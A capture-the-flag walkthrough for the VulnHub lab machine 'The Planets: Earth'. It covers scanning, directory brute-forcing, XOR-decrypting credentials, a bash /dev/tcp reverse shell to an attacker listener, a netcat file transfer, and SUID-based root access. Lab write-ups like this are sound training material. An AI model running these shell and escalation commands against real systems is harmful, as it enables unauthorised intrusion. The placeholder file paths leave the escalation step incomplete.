# 🌍 The Planets: Earth – VulnHub Walkthrough

**Author**: [SirFlash](https://www.vulnhub.com/entry/the-planets-earth,755/)  
**Difficulty**: Easy  
**Flags**: 2 (User & Root)  
**Tools Used**: `netdiscover`, `nmap`, `gobuster`, `CyberChef`, `netcat`, `ltrace`

---

## 🛰️ 1. Reconnaissance

### 🔍 Discover Target IP

Use `netdiscover` to identify the target machine's IP address:

```bash
netdiscover
```

Assuming the target IP is `192.168.56.106`.

### 🔎 Port Scanning

Perform a comprehensive scan using `nmap`:

```bash
nmap -sV -sC -p- 192.168.56.106
```

Open ports identified:

- 22/tcp – SSH
- 80/tcp – HTTP
- 443/tcp – HTTPS

### 🧾 Analyze SSL Certificate

Accessing `https://192.168.56.106` reveals a Fedora admin page. Inspecting the SSL certificate uncovers DNS names:

- `earth.local`
- `terratest.earth.local`

Add these to my `/etc/hosts` file:

```bash
echo "192.168.56.106 earth.local" | sudo tee -a /etc/hosts
echo "192.168.56.106 terratest.earth.local" | sudo tee -a /etc/hosts
```

---

## 🌐 2. Web Enumeration

### 📂 Directory Brute-Forcing

Use `gobuster` to find hidden directories:

```bash
gobuster dir -u http://earth.local -w /home/lin/Documents/dirb/rockyou.txt
gobuster dir -u https://terratest.earth.local -w  /home/lin/Documents/dirb/rockyou.txt -k
```

Notable findings:

- `/admin` on `earth.local`
- `/robots.txt` on `terratest.earth.local`

### 📄 Analyze `robots.txt`

Access `https://terratest.earth.local/robots.txt` to find:

```
/testingnotes.txt
/testdata.txt
```

`testingnotes.txt` reveals:

- Username: `terra`
- Encryption method: XOR
- Key file: `testdata.txt`

---

## 🔐 3. Decrypting Credentials

The main page at `earth.local` displays encrypted messages. Using [CyberChef](https://gchq.github.io/CyberChef/):

1. Input the encrypted message.
2. Use the `XOR` operation with the contents of `testdata.txt` as the key.

Decryption yields the password: `earthclimatechangebad4humans`

---

## 🛠️ 4. Gaining Initial Access

### 🔑 Login to Admin Panel

Navigate to `http://earth.local/admin` and login with:

- Username: `terra`
- Password: `earthclimatechangebad4humans`

The panel provides a command execution interface.

### 🐚 Establish Reverse Shell

**On my machine (192.168.56.103):**

```bash
nc -lvnp 4444
```

**On the target (via admin panel):**

```bash
bash -i >& /dev/tcp/192.168.56.103/4444 0>&1
```

---

## 🧑‍💻 5. Privilege Escalation

### 🔍 Find SUID Binaries

On the target machine:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable binary: `/usr/bin/reset_root`

### 📤 Transfer Binary for Analysis

**On my machine:**

```bash
nc -lvnp 3333 > reset_root
```

**On the target:**

```bash
cat /usr/bin/reset_root > /dev/tcp/192.168.56.103/3333
```

### 🧪 Analyze with `ltrace`

On my machine:

```bash
ltrace ./reset_root
```

The output indicates missing files required by the binary. Create them on the target:

```bash
touch /path/to/missing/file1
touch /path/to/missing/file2
touch /path/to/missing/file3
```

After creating the files, execute:

```bash
/usr/bin/reset_root
```

This resets the root password to `Earth`.

### 🔐 Gain Root Access

```bash
su root
```

Password: `Earth`

---

## 🏁 6. Capture Flags

- **User Flag**: Located in `/var/earth_web/`
- **Root Flag**: Located in `/root/`

---

## 📝 Conclusion

This walkthrough demonstrates the importance of thorough enumeration and analysis in penetration testing. By leveraging tools like `nmap`, `gobuster`, and `ltrace`, and utilizing online resources like CyberChef, we successfully gained root access to the target machine.

---

*Note: This walkthrough is for educational purposes only.*
